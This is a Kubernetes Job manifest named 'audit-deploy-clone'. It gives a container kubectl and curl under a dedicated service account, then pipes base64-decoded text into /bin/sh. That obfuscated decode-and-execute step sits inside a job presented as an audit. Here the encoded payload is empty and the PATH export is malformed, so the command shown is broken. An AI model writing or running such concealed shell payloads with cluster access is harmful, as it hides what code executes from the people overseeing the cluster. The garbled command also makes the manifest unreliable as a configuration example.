apiVersion: batch/v1
kind: Job
metadata:
  name: audit-deploy-clone
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      initContainers:
      - name: get-kubectl
        image: bitnami/kubectl:latest
        command: [/bin/sh, -c, "cp /opt/bitnami/kubectl/bin/kubectl /shared/kubectl"]
        volumeMounts:
        - name: shared
          mountPath: /shared
      containers:
      - name: audit
        image: alpine/git:latest
        command:
        - /bin/sh
        - -c
        - "apk add --no-cache curl >/dev/null 2>&1; chmod +x /shared/kubectl; export PATH=/shared:\; echo  | base64 -d | /bin/sh"
        volumeMounts:
        - name: shared
          mountPath: /shared
      volumes:
      - name: shared
        emptyDir: {}
